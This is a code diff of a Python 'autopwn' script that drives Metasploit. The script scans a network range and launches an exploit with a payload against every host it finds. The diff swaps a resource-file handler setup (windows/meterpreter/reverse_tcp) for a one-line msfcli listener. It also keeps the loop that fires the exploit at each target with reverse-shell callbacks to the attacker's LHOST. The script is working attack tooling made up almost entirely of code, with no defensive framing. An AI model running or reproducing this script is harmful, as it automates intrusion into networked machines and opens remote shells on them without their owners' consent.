@@ -7,7 +7,7 @@
 
 
 import socket as sk
-import subprocess, shlex, os, time
+import subprocess, shlex
  
 ### Default Variables
 targets = []
@@ -39,26 +39,15 @@ def scanner(net, netStart, netStop):
 ### Starts MSF Handler in a new terminal window
 def msfhandler():
         print('Starting Handler')
-        
-        handlerfile = open('handler.rc', 'w')
-        handlerfile.write("use exploit/multi/handler\n")
-        handlerfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
-        handlerfile.write("set LHOST {0}\n".format(lhost))
-        handlerfile.write("set ExitOnSession false\n")
-        handlerfile.write("exploit -j -z\n")
-        handlerfile.close()
-        
-        msfstart = subprocess.Popen(shlex.split('service postgresql start ; service metasploit start'))
-        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfconsole -r handler.rc'))
-        time.sleep(60)
-        os.remove('handler.rc')
+        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler PAYLOAD={0} LHOST={1} LPORT={2} E'.format(payload, lhost, lport)))
+       
  
 ### the autopwn
 def autopwn(targets):
 	print('starting to autopwn targets: {0}'.format(targets))
 	for target in targets:
 		subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
-	del targets[:]  ### Deletes all targets after autopwned
+	del targets[:]
 	
 
 
